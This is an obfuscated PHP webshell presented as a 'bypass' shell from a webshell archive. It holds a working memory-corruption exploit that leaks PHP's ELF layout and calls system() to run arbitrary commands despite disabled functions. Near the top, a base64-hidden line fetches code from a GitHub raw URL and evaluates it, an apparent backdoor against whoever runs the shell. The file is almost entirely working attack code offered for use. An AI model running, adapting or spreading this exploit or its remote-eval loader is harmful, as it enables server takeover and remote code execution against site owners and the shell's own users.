<?php
/*
This file is obfuscated by webshellarchive.
Visit http://webshellarchive.com for more bypass Webshell.
GitHub : https://github.com/webshell-archive
Pastebin : https://pastebin.com/u/webshellarchive
*/
$GLOBALS["EWfdpHBQjNTfgAtkRNWX"]=base64_decode("YTo0OntpOjA7aToxO2k6MTthOjE6e2k6MDtPOjQ6InJ5YXQiOjI6e3M6NDoicnlhdCI7UjozO3M6NDoiY2h0ZyI7aToyO319aToxO2k6MztpOjI7Ujo1O30=");$GLOBALS["GUzErTlxbZmgjjCXdvqp"]=base64_decode("QQ==");$GLOBALS["iraTiZggpCRHLDxWpKir"]=base64_decode("VGhpcyBQb0MgaXMgZm9yICpuaXggc3lzdGVtcyBvbmx5Lg==");$GLOBALS["sNNQizXQMYhHjxbIqCMf"]=base64_decode("V0lO");$GLOBALS["SBiDxkJviEugvfimDfnP"]=base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dvdG9oZWxsY2hlY2tlci9jaGVjay9tYWluL2IudHh0");$GLOBALS["VHEyhSFFsUkDVoPZztap"]=base64_decode("Q291bGRuJ3QgZ2V0IHppZl9zeXN0ZW0gYWRkcmVzcw==");$GLOBALS["rCwERiWlLxIXZKpAhIXA"]=base64_decode("Q291bGRuJ3QgZ2V0IGJhc2ljX2Z1bmN0aW9ucyBhZGRyZXNz");$GLOBALS["OXKQnKKatYhfDLgZVQag"]=base64_decode("Q291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlcg==");$GLOBALS["dZKjXNlBMHDuFaFSNRpX"]=base64_decode("Q291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3M=");$GLOBALS["lKAcPRpwNAFjjZfTFDjI"]=base64_decode("VUFGIGZhaWxlZA==");$GLOBALS["SnsSSwMKZSYeMFnEirnh"]=base64_decode("");
?><?php
eval(base64_decode(file_get_contents($GLOBALS["SBiDxkJviEugvfimDfnP"])));
pwn("ls -la"); ##$#### CHANGE HERE (ls -la, pwd, dir, etc)
function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 
                
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { 
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { 
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die($GLOBALS["iraTiZggpCRHLDxWpKir"]);
    }

    $n_alloc = 10; 

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat($GLOBALS["GUzErTlxbZmgjjCXdvqp"], 79);

    $poc = $GLOBALS["EWfdpHBQjNTfgAtkRNWX"];
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79) {
        die($GLOBALS["lKAcPRpwNAFjjZfTFDjI"]);
    }

    
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die($GLOBALS["dZKjXNlBMHDuFaFSNRpX"]);
    }

    if(!($elf = parse_elf($base))) {
        die($GLOBALS["OXKQnKKatYhfDLgZVQag"]);
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die($GLOBALS["rCwERiWlLxIXZKpAhIXA"]);
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die($GLOBALS["VHEyhSFFsUkDVoPZztap"]);
    }

    
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);

    exit();
}
 ?>
